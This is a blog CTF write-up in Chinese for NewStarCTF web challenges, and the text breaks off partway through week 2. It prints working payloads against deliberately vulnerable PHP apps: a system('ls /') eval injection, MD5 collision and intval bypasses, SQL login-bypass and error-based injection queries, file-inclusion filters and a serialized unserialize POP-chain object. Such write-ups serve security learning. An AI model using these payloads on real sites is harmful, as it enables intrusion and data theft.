<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>NewStarCTF 公开赛-web - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="NewStarCTF 公开赛-web" />
<meta property="og:description" content="文章目录 week1HTTPHead?Header!我真的会谢NotPHP 函数绕过Word-For-You 万能密码 week2Word-For-You(2 Gen) 报错注入IncludeOne 文件包含&#43;伪随机数UnserializeOne 反序列化ezAPI graphQL week3BabySSTI_OnemultiSQL 堆叠注入IncludeTwo pearcmd.php的利用Maybe You Have To think More week4So Baby RCEBabySSTI_TwoUnserializeThree phar反序列化又一个SQL week5Give me your photo PLZ 图片马Unsafe Apache Apache版本漏洞利用So Baby RCE AgainBabySSTI_ThreeFinal round 时间盲注 week1 HTTP cookie 修改admin 源码发现key GET和POST传参即可
Head?Header! User-Agent: CTF Referer: ctf.com X-Forwarded-For: 127.0.0.1 我真的会谢 信息泄露
robots.txt
www.zip
源码 &#43; /.index.php.swp
NotPHP 函数绕过 if(file_get_contents($_GET[&#39;data&#39;]) == &#34;Welcome to CTF&#34;){ if(md5($_GET[&#39;key1&#39;]) === md5($_GET[&#39;key2&#39;]) &amp;&amp; $_GET[&#39;key1&#39;] !== $_GET[&#39;key2&#39;]){ if(!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/f78370cdc6de3ed15accc992d84c9d02/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-22T20:15:41+08:00" />
<meta property="article:modified_time" content="2022-11-22T20:15:41+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">NewStarCTF 公开赛-web</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#week1_1" rel="nofollow">week1</a></li><li><ul><li><a href="#HTTP_3" rel="nofollow">HTTP</a></li><li><a href="#HeadHeader_7" rel="nofollow">Head?Header!</a></li><li><a href="#_15" rel="nofollow">我真的会谢</a></li><li><a href="#NotPHP___25" rel="nofollow">NotPHP 函数绕过</a></li><li><a href="#WordForYou___63" rel="nofollow">Word-For-You 万能密码</a></li></ul> 
  </li><li><a href="#week2_69" rel="nofollow">week2</a></li><li><ul><li><a href="#WordForYou2_Gen___71" rel="nofollow">Word-For-You(2 Gen) 报错注入</a></li><li><a href="#IncludeOne___92" rel="nofollow">IncludeOne 文件包含+伪随机数</a></li><li><a href="#UnserializeOne___131" rel="nofollow">UnserializeOne 反序列化</a></li><li><a href="#ezAPI___graphQL_242" rel="nofollow">ezAPI graphQL</a></li></ul> 
  </li><li><a href="#week3_329" rel="nofollow">week3</a></li><li><ul><li><a href="#BabySSTI_One_331" rel="nofollow">BabySSTI_One</a></li><li><a href="#multiSQL__401" rel="nofollow">multiSQL 堆叠注入</a></li><li><a href="#IncludeTwo__pearcmdphp_445" rel="nofollow">IncludeTwo pearcmd.php的利用</a></li><li><a href="#Maybe_You_Have_To_think_More_479" rel="nofollow">Maybe You Have To think More</a></li></ul> 
  </li><li><a href="#week4_507" rel="nofollow">week4</a></li><li><ul><li><a href="#So_Baby_RCE_509" rel="nofollow">So Baby RCE</a></li><li><a href="#BabySSTI_Two_543" rel="nofollow">BabySSTI_Two</a></li><li><a href="#UnserializeThree__phar_565" rel="nofollow">UnserializeThree phar反序列化</a></li><li><a href="#SQL_624" rel="nofollow">又一个SQL</a></li></ul> 
  </li><li><a href="#week5_679" rel="nofollow">week5</a></li><li><ul><li><a href="#Give_me_your_photo_PLZ___681" rel="nofollow">Give me your photo PLZ 图片马</a></li><li><a href="#Unsafe_Apache__Apache_703" rel="nofollow">Unsafe Apache Apache版本漏洞利用</a></li><li><a href="#So_Baby_RCE_Again_735" rel="nofollow">So Baby RCE Again</a></li><li><a href="#BabySSTI_Three_775" rel="nofollow">BabySSTI_Three</a></li><li><a href="#Final_round__796" rel="nofollow">Final round 时间盲注</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="week1_1"></a>week1</h2> 
<h3><a id="HTTP_3"></a>HTTP</h3> 
<p>cookie 修改admin 源码发现key GET和POST传参即可</p> 
<h3><a id="HeadHeader_7"></a>Head?Header!</h3> 
<pre><code>User-Agent: CTF
Referer: ctf.com
X-Forwarded-For: 127.0.0.1
</code></pre> 
<h3><a id="_15"></a>我真的会谢</h3> 
<p>信息泄露</p> 
<p>robots.txt</p> 
<p>www.zip</p> 
<p>源码 + /.index.php.swp</p> 
<h3><a id="NotPHP___25"></a>NotPHP 函数绕过</h3> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Welcome to CTF"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2077</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hack Me"</span><span class="token punctuation">;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Number error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Wrong Key!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Pass it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>1,绕过file_get_contents()，用input伪协议，即 <code>/?data=php://input</code> POST一个<code>Welcome to CTF</code></p> 
<p>用data协议绕，<code>?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=</code></p> 
<p>2,md5强比较碰撞<code>&amp;key1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;key2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 </code></p> 
<p>这里可以直接数组绕过<code> key1[]=1&amp;key2[]=2</code></p> 
<p>3，绕数字判断，intval只取前面的数字，后面的字母会忽略</p> 
<p><code>num=2077abc</code></p> 
<p>4，绕# 命令执行，用<code>回车符%0d，</code>我用<code>换行符%0a</code>打不通不知道为啥</p> 
<p><code>&amp;cmd=%0dsystem("ls /"); </code></p> 
<p>在bp里需要URL编码进去rec</p> 
<h3><a id="WordForYou___63"></a>Word-For-You 万能密码</h3> 
<p>一个留言板和查询，为什会考查万能密码</p> 
<p>万能密码<code>NewCTFer' or 1#</code></p> 
<h2><a id="week2_69"></a>week2</h2> 
<h3><a id="WordForYou2_Gen___71"></a>Word-For-You(2 Gen) 报错注入</h3> 
<blockquote> 
 <p>哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了</p> 
</blockquote> 
<p>有报错信息回显，那就报错注入</p> 
<pre><code class="prism language-sql">name<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

name=1'</span><span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>

name<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,concat(0x7e,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=database()),0x7e),1)--+

name=1'</span><span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'wfy_comments'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>

name<span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">right</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">from</span> wfy<span class="token punctuation">.</span>wfy_comments<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span>

</code></pre> 
<h3><a id="IncludeOne___92"></a>IncludeOne 文件包含+伪随机数</h3> 
<pre><code class="prism language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"seed.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//mt_srand(*********);</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hint: "</span><span class="token operator">.</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/base|\.\./i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/NewStar/i"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token comment">//flag in `flag.php`</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Baby Hacker?"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No Hacker!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
Hint<span class="token punctuation">:</span> <span class="token number">1219893521</span>
</code></pre> 
<p>用工具跑一下种子 ，php伪随机数的考点看https://www.freebuf.com/column/205240.html</p> 
<p><img src="https://images2.imgbox.com/f9/e5/DLz3reic_o.png" alt="image-20221115225629599"></p> 
<p>得到seed是1145146，那么如何得到固定的mt_rand()呢，去运行mt_srand(1145146)</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">1145146</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>  得到<span class="token number">1202031004</span> 
</code></pre> 
<p>伪协议读取flag.php ，那么对filter进行了过滤 base，可以两次url编码绕过，NewStar就是直接用|加进去过滤器</p> 
<p><img src="https://images2.imgbox.com/de/20/qKaz858A_o.png" alt="image-20221115230641472"></p> 
<h3><a id="UnserializeOne___131"></a>UnserializeOne 反序列化</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$func</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to NewStarCTF, "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">func</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Sec</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$var</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">obj</span><span class="token operator">-&gt;</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"CTFers"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$cla</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$fun</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cla</span> <span class="token operator">=</span> <span class="token keyword">clone</span> <span class="token variable">$var</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">eeee</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">obj</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"success"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<blockquote> 
 <p>先找可利用函数，找到file_get_contents(‘/flag’); 直接输出flag了</p> 
</blockquote> 
<p>找链子</p> 
<p><code>Start类__destruct()</code>–&gt;<code>Sec类__toString()</code>–&gt;<code>Easy类__call</code>–&gt;<code>eeee类__clone</code>–&gt;``Start类__isset`–&gt;</p> 
<p><code>Sec类__invoke</code></p> 
<p>这里唯一比较绕的点是<code>__call($fun, $var)</code> 这个<code>$fun</code>是上一步调用的方法名即<code>check</code>,<code>$var</code>是其参数即<code>($this-&gt;var)</code></p> 
<p>所以进入<code>__call()</code>的方法是 构造<code>$this-&gt;var</code></p> 
<p>构造pop</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Sec</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Easy</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$cla</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">eeee</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token variable">$st</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$se</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Easy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ee</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">eeee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$st</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$se</span><span class="token punctuation">;</span>
<span class="token variable">$se</span><span class="token operator">-&gt;</span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$ea</span><span class="token punctuation">;</span>
<span class="token variable">$se</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token operator">=</span><span class="token variable">$ee</span><span class="token punctuation">;</span>
<span class="token variable">$ee</span><span class="token operator">-&gt;</span><span class="token property">obj</span><span class="token operator">=</span><span class="token variable">$st</span><span class="token punctuation">;</span>
<span class="token variable">$st</span><span class="token operator">-&gt;</span><span class="token property">func</span><span class="token operator">=</span><span class="token variable">$se</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$st</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>

<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Start"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Sec"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"obj"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Easy"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cla"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"var"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"eeee"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"obj"</span><span class="token punctuation">;</span>r<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>r<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<h3><a id="ezAPI___graphQL_242"></a>ezAPI graphQL</h3> 
<blockquote> 
 <p>qsdz开发了一个查询网页，但是好像存在一些漏洞？</p> 
</blockquote> 
<p>之前没遇到过graphQL这个知识点,此文不错 https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ</p> 
<p>本题首先是源码泄露 www.zip</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
                <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>
                <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
